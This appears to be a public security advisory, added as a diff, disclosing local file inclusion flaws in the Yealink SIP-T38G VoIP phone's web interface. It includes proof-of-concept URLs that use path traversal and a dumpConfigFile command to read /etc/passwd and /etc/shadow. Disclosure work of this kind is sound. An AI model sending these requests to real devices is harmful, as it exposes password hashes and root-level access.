@@ -1,0 +1,23 @@
+Title: Yealink VoIP Phone SIP-T38G Local File Inclusion
+Author: Mr.Un1k0d3r & Doreth.Z10 From RingZer0 Team
+Vendor Homepage: http://www.yealink.com/Companyprofile.aspx
+Version: VoIP Phone SIP-T38G
+CVE: CVE-2013-5756, CVE-2013-5757
+
+Description:
+
+Web interface contain a vulnerability that allow any page to be included.
+We are able to disclose /etc/passwd & /etc/shadow
+
+POC:
+Using the page parameter (CVE-2013-5756):
+http://
+[host]/cgi-bin/cgiServer.exx?page=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+http://
+[host]/cgi-bin/cgiServer.exx?page=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow
+
+Using the command parameter (CVE-2013-5757):
+http://[host]/cgi-bin/cgiServer.exx?command=dumpConfigFile("/etc/shadow")
+
+*By viewing the shadow file we are able to conclude that cgiServer.exx run
+under the root privileges. This lead to CVE-2013-5759.
